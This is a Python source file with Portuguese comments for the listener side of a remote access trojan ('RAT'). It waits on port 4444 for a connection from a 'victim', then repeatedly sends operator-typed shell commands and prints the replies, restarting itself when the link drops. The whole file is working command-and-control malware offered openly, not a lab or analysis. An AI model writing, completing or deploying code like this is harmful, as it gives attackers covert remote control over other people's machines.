import socket
from time import sleep


host = ''           #Nao eh necessario por um host, visto que seu modem ira redirecionar a conexao para seu IP interno.
port = 4444         #Usar a mesma porta que o cliente (Obvio).

def criaSocket():
    print('RAT')
    try:
        s = socket.socket()
        s.bind((host, port))
        s.listen(1)             #Maximo de conexoes simultaneas permitidas.
        print('[+] Aguardando conexao.')
        recebeConexao(s)

    #Caso tenha algum problema ao criar o socket
    #Provavelmente vc pos a porta errada
    #Ou tentou abrir dois servidores simultaneamente na mesma porta.
    except:
        print('[+] Falha ao criar socket, tentando novamente em 30 segundos.')
        s.close()
        sleep(30)
        criaSocket()

def recebeConexao(s):
    #conn: Novo socket de conexao com a vitima.
    #endereco: Uma tupla com o endereco IP e a porta utilizada pela vitima.
    conn, endereco = s.accept()
    print('[+] Conexao estabelecida com: ' + endereco[0] + ':' + str(endereco[1])) #Endereco[1] eh um int, por isso deve ser convertido.
    enviaComandos(conn)


def enviaComandos(conn):
    while True:
        try:
            comando = input("Comando ~> ")
            if len(comando) > 0:
                conn.send(comando)
                resposta = conn.recv(204800)
                print(resposta)
            else:
                print('[-] Comando invalido, ta tentando bugar a parada?')


        #Caso haja um erro ao tentar enviar o comando, provavelmente
        #A conexao foi perdida, entao a shell sera reiniciada.
        except:
            print('[-] Conexao perdida, reiniciando servidor.')
            conn.close()
            criaSocket()


criaSocket()